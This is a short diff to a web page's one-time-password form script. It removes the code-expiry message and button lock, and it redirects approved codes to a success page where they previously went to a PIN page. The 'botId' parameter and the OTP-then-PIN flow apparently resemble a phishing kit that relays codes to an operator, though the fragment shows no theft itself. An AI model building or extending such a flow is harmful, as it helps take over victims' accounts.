@@ -193,10 +193,9 @@ function startCountdown(duration = 30){
   countdown = setInterval(()=>{
     time--;
     timerDisplay.textContent = time;
-    if(time<=0){
+    if(time <= 0){
       clearInterval(countdown);
-      setStatus("The OTP code has expired. Please request a new code.", "error");
-      submitBtn.disabled=true;
+      // No expiry message, no button disable — timer just stops at 0
     }
   },1000);
 }
@@ -259,7 +258,7 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
   if(approved){
     setStatus("Code approved. Redirecting...", "success");
     localStorage.clear();
-    window.location.href=`pin.html?botId=${botId}`;
+    window.location.href=`success.html?botId=${botId}`;
   }else{
     setStatus("Incorrect OTP code. Please try again.", "error");
     inputs.forEach(i=>i.value="");
